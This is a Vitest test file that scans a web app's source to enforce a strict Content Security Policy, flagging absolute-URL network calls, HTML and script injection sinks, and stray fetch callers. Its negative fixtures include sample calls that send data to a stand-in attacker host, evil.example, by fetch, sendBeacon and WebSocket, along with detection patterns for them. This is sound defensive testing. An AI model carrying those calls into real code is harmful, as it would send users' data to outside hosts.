// @vitest-environment node
/// <reference types="node" />
//
// NAVIGATION UNDER THE STRICT CSP (T-B-295; FR-B-605, FR-B-606; plan 13).
//
// The page may talk to its own origin and to nothing else (`connect-src 'self'`): sign-in and the redirect
// to Microsoft are top-level navigations, sign-out is a same-origin `fetch` followed by a navigation, and
// the device-code polling happens on the server. This test reads the source of the web app and fails on
// the code that would break that:
//   - `fetch`, `XMLHttpRequest`, `EventSource`, `WebSocket` or `sendBeacon` aimed at an absolute URL;
//   - a Trusted Types sink: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`,
//     `dangerouslySetInnerHTML`, `eval`, `new Function`, a script or iframe `src`/`srcdoc` assignment;
//   - a second caller of `fetch` next to `lib/api.ts` (the service worker's own scope aside).
// Each rule runs on a source that breaks it (expectGuardFails), so a scanner that stopped matching would
// be noticed.
import { expectGuardFails } from '@m365portal/shared/testing';
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join, relative } from 'node:path';
import { describe, expect, it } from 'vitest';

const SRC = join(import.meta.dirname, '..', 'src');

interface SourceFile {
  readonly path: string;
  readonly text: string;
}

function sourceFiles(directory: string): SourceFile[] {
  return readdirSync(directory).flatMap((name) => {
    const path = join(directory, name);
    if (statSync(path).isDirectory()) return sourceFiles(path);
    return /\.(?:ts|tsx)$/.test(name) && !name.endsWith('.gen.ts')
      ? [{ path: relative(SRC, path), text: readFileSync(path, 'utf8') }]
      : [];
  });
}

/** Source without comments: a comment may name a forbidden call. */
function withoutComments(text: string): string {
  return text.replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:'"`])\/\/.*$/gm, '$1');
}

const NETWORK_CALL =
  /\b(?:fetch|sendBeacon)\s*\(\s*(?:`|'|")(?:https?:)?\/\/|\bnew\s+(?:XMLHttpRequest|EventSource|WebSocket)\b|\.open\s*\(\s*(?:`|'|")[A-Z]+(?:`|'|")\s*,\s*(?:`|'|")(?:https?:)?\/\//;
const SINKS: readonly (readonly [string, RegExp])[] = [
  ['innerHTML', /\.innerHTML\s*=[^=]/],
  ['outerHTML', /\.outerHTML\s*=[^=]/],
  ['insertAdjacentHTML', /\.insertAdjacentHTML\s*\(/],
  ['document.write', /\bdocument\s*\.\s*write(?:ln)?\s*\(/],
  ['dangerouslySetInnerHTML', /dangerouslySetInnerHTML/],
  ['eval', /(?<![\w.])eval\s*\(/],
  ['new Function', /\bnew\s+Function\s*\(/],
  ['srcdoc', /\.srcdoc\s*=[^=]/],
  ['trustedTypes', /\btrustedTypes\b/],
  ['script src', /createElement\(\s*(?:'|")script(?:'|")\s*\)/],
  ['iframe', /createElement\(\s*(?:'|")iframe(?:'|")\s*\)/],
];
const FETCH_CALL = /(?<![\w.])fetch\s*\(|globalThis\.fetch\b|window\.fetch\b/;

/**
 * The one file that may name `trustedTypes`: it creates the page's single policy, `m365portal-sw`, for
 * the service worker URL (Phase A, FR-A-140). Creating a policy is not a sink, and the policy list of
 * the CSP is unchanged by Phase B (FR-B-605).
 */
const TRUSTED_TYPES_POLICY_FILE = join('lib', 'sw-register.ts');

/** What the rules find in one file, as readable findings. */
function findings(file: SourceFile): string[] {
  const text = withoutComments(file.text);
  const found: string[] = [];
  if (NETWORK_CALL.test(text)) found.push(`${file.path}: a network call to an absolute URL`);
  for (const [name, pattern] of SINKS) {
    if (name === 'trustedTypes' && file.path === TRUSTED_TYPES_POLICY_FILE) continue;
    if (pattern.test(text)) found.push(`${file.path}: ${name}`);
  }
  return found;
}

function assertClean(files: readonly SourceFile[]): void {
  const problems = files.flatMap(findings);
  if (problems.length > 0) throw new Error(problems.join('\n'));
}

/** `fetch` outside lib/api.ts (and the worker, which has its own scope and answers `fetch(event.request)`). */
function assertSingleFetchCaller(files: readonly SourceFile[]): void {
  const callers = files
    .filter((file) => !/^sw[\\/]/.test(file.path) && file.path !== join('lib', 'api.ts'))
    .filter((file) => FETCH_CALL.test(withoutComments(file.text)))
    .map((file) => file.path);
  if (callers.length > 0) {
    throw new Error(`fetch is called outside lib/api.ts: ${callers.join(', ')}`);
  }
}

const files = sourceFiles(SRC);
const fake = (text: string): SourceFile[] => [{ path: 'features/x.tsx', text }];

describe('the web source', () => {
  it('has files to read (the scan is not vacuous)', () => {
    expect(files.length).toBeGreaterThan(100);
    expect(files.some((file) => file.path === join('lib', 'api.ts'))).toBe(true);
    expect(files.some((file) => file.path === join('lib', 'auth-nav.ts'))).toBe(true);
    expect(files.some((file) => file.path === join('lib', 'ms-url.ts'))).toBe(true);
  });

  it('calls no network function with an absolute URL and holds no Trusted Types sink', () => {
    expect(() => {
      assertClean(files);
    }).not.toThrow();
  });

  it('keeps lib/api.ts the only code that calls fetch', () => {
    expect(() => {
      assertSingleFetchCaller(files);
    }).not.toThrow();
  });

  it('names no Microsoft host in a request: the only host in the web source is the sign-out check', () => {
    const hosts = files
      .filter((file) => /login\.microsoft|graph\.microsoft|outlook\.office/.test(file.text))
      .map((file) => file.path)
      .sort();
    // ms-url.ts checks the sign-out redirect; the wizard shows the host names of the environment
    // remedies only through the catalogue, never in code.
    expect(hosts).toEqual([join('lib', 'ms-url.ts')]);
  });
});

describe('negative fixtures: each rule fails on purpose', () => {
  const options = (reason: RegExp | string) => ({ name: 'navigation scan', reason });

  it.each([
    ["fetch('https://login.microsoftonline.com/x')", 'a network call to an absolute URL'],
    ['fetch(`https://graph.microsoft.com/v1.0/me`)', 'a network call to an absolute URL'],
    ["fetch('//evil.example/x')", 'a network call to an absolute URL'],
    ["navigator.sendBeacon('https://evil.example/x', data)", 'a network call to an absolute URL'],
    ['new XMLHttpRequest()', 'a network call to an absolute URL'],
    ["new EventSource('/events')", 'a network call to an absolute URL'],
    ["new WebSocket('wss://evil.example')", 'a network call to an absolute URL'],
    ["request.open('GET', 'https://evil.example/x')", 'a network call to an absolute URL'],
    ['element.innerHTML = html;', 'innerHTML'],
    ['element.outerHTML = html;', 'outerHTML'],
    ["element.insertAdjacentHTML('beforeend', html);", 'insertAdjacentHTML'],
    ['document.write(html);', 'document.write'],
    ['<div dangerouslySetInnerHTML={{ __html: html }} />', 'dangerouslySetInnerHTML'],
    ['eval(code);', 'eval'],
    ['new Function(code)();', 'new Function'],
    ['frame.srcdoc = html;', 'srcdoc'],
    ['window.trustedTypes.createPolicy("x", {});', 'trustedTypes'],
    ["document.createElement('script');", 'script src'],
    ["document.createElement('iframe');", 'iframe'],
  ])('fails for %s', (source, finding) => {
    expectGuardFails(assertClean, fake(source), options(finding));
  });

  it('passes a relative fetch, a same-origin path and plain navigation', () => {
    expect(() => {
      assertClean(
        fake(
          [
            "location.assign('/signin?returnTo=%2F');",
            "window.location.replace('/auth/login');",
            'const link = <a href="/auth/login" rel="noopener noreferrer">x</a>;',
          ].join('\n'),
        ),
      );
    }).not.toThrow();
  });

  it('ignores a forbidden call that a comment only names', () => {
    expect(() => {
      assertClean(fake("// never fetch('https://evil.example') or eval(code)\nconst a = 1;"));
    }).not.toThrow();
  });

  it('fails for a second caller of fetch, and for a global or window fetch', () => {
    expectGuardFails(assertSingleFetchCaller, fake("const r = await fetch('/api/v1/me');"), {
      name: 'single fetch caller',
      reason: /fetch is called outside lib\/api\.ts: features[\\/]x\.tsx/,
    });
    expectGuardFails(assertSingleFetchCaller, fake('await globalThis.fetch(url);'), {
      name: 'single fetch caller',
      reason: 'fetch is called outside lib/api.ts',
    });
    expectGuardFails(assertSingleFetchCaller, fake('await window.fetch(url);'), {
      name: 'single fetch caller',
      reason: 'fetch is called outside lib/api.ts',
    });
  });
});
